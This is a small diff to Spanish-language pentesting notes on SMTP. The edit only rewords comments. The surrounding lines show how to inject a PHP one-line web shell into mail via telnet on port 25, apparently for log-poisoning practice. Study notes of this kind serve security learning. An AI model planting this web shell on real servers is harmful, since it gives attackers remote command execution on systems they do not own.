@@ -33,8 +33,8 @@ Tags: #SMTP
 
 ❯ telnet <IP> 25               # Conectarnos al servicio SMTP
 
-	❯ MAIL FROM: Admin        # Primero definimos el remitente del mensaje
-	❯ RCPT TO: Omar           # Define el destinatario de un mensaje
+	❯ MAIL FROM: Admin        # Primero se define el remitente del mensaje
+	❯ RCPT TO: Omar           # Definir el destinatario de un mensaje
 	❯ DATA                    # Indica que se enviará data en el mensaje 
 		❯ <?php system($_GET['cmd']); ?>    # Data que se enviará
 		❯ .                  # El punto indica que se termina la data a enviar
